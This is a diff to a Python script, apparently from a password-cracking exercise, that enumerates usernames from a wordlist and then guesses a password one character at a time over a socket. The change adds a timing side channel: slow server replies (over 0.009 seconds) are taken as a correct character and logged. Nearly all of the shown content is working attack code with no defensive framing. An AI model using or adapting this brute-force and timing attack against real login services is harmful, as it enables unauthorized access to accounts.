@@ -4,6 +4,8 @@ import itertools
 import string
 import json
 from icecream import ic
+import time 
+import logging
 
 """
 Args: Host, port
@@ -28,11 +30,15 @@ with open('logins.txt', "r") as f:
 
 def send_data(s1, data):
     to_send = json.dumps(data)
+    t1 = time.time()
     s1.send(to_send.encode('utf8'))
-    response = s1.recv(1024).decode()
-    response = json.loads(response)
-    print("Response:", response)
-    return response
+    resp = s1.recv(1024).decode()
+    t2 = time.time()
+    time_resp = t2 - t1
+    resp = json.loads(resp)
+    if time_resp > 0.0005:
+        logging.info("TIME:: " + str(t2-t1) + "\tresp:: " + resp['result'])
+    return resp, time_resp
 
 secret_login = ""
 secret_password = ""
@@ -43,7 +49,7 @@ for login in login_list:
     "login": login,
     "password": "" }
     
-    response = send_data(socket_1, login_json)
+    response, time_resp = send_data(socket_1, login_json)
     ic(login_json)
 
     if response['result'] == 'Wrong password!':
@@ -59,12 +65,16 @@ while response['result'] != "Connection success!":
     for char in enumerate(all_char):
         test = pas + char[1]
 
-        response = send_data(socket_1, {"login": secret_login, "password": test})
+        response, time_resp = send_data(socket_1, {"login": secret_login, "password": test})
         
         if response['result'] == "Connection success!":
            
            pas += char[1]
            break
+        elif time_resp > 0.009:
+            pas += char[1]
+            logging.info("ADDED TO PASSWORD:" + pas)
+            break
         elif response['result'] == "Wrong password!":
             continue
         elif response['result'] == 'Exception happened during login':
